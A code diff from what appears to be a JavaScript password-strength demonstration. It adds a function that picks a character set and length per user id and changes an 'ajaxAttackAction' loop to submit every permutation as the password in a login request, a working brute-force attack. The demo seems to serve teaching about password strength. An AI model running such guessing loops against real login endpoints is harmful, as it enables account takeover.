@@ -24,12 +24,40 @@ const sendAction = async function () {
     response.status === 200 ? `OK` : `KO`;
 };
 
+const getBaseNForUserId = (userId) => {
+  const NUMBERS = '123456789';
+  const CHARACTERS = 'abcdefghijklmnopqrstuvwxyz';
+  const SPECIAL_CHARACTERS = '/*-+.<>,.?;:\\\'"|[{]}_=`~!@#$%^&()';
+
+  if (userId === '1') {
+    return new BaseN(NUMBERS, 4);
+  }
+
+  if (userId === '2') {
+    return new BaseN(NUMBERS, 5);
+  }
+
+  if (userId === '3') {
+    return new BaseN(CHARACTERS, 4);
+  }
+
+  if (userId === '4') {
+    return new BaseN(NUMBERS + CHARACTERS, 4);
+  }
+
+  if (userId === '5') {
+    return new BaseN(NUMBERS + CHARACTERS + SPECIAL_CHARACTERS, 4);
+  }
+};
+
 const ajaxAttackAction = async function () {
   const formData = getFormData();
 
   const resultElement = document.querySelector('.js-form-result');
 
-  for (const permutation of new BaseN('123456789', 4)) {
+  const baseN = getBaseNForUserId(formData.id);
+
+  for (const permutation of baseN) {
     formData.password = permutation.join('');
 
     const response = await sendRootRequest(formData);
